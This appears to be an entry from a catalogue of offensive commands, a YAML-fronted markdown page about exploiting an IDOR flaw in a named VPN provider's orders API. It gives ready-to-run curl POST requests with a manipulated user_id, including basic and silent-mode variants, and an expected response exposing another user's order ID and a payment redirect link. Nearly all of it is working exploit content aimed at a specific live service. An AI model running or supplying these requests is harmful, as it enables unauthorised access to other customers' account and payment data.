---
data: >-
  curl -X POST https://join.nordvpn.com/api/v1/orders -H "Accept:
  application/json" -H "Accept-Language: en-US,en;q=0.5" -H "Content-Type:
  application/json" -d
  '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":23093782,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
tags:
  - idor
  - http-post
  - api
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:52.895Z'
id: 50ee8a3b-e858-4fb8-875b-b4591bbb2932
verified: false
validated: true
submitted: true
---
# nordvpn-idor-post-user23093782

## Command

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Content-Type: application/json" \
  -d '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":23093782,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

## Description

This command exploits IDOR by posting with user_id 23093782, resulting in data for user 89495166, to demonstrate arbitrary user data access in the NordVPN API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-H "Accept: application/json"` | JSON response format | Yes |
| `-H "Content-Type: application/json"` | JSON payload | Yes |
| `-d '{...}'` | Payload with modified user_id | Yes |
| `user_id:23093782` | Manipulated user ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders -H "Content-Type: application/json" -d '{"user_id":23093782}'
```

### Advanced Usage

With silent mode `-s`:

```bash
curl -s -X POST https://join.nordvpn.com/api/v1/orders -H "Content-Type: application/json" -d '{"action":"order","plan_id":653,"user_id":23093782}'
```

## Expected Output

{"id":42616121,"user_id":89495166,"confirmation":{"id":23093782,"type":"redirect","value":"https:\/\/pay.gocardless.com\/flow\/RE000W16X7XH4JCXJZ623MS6H7W316N3"}}

## Related

- [[commands/nordvpn-idor-post-user20027039]]
- [[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]
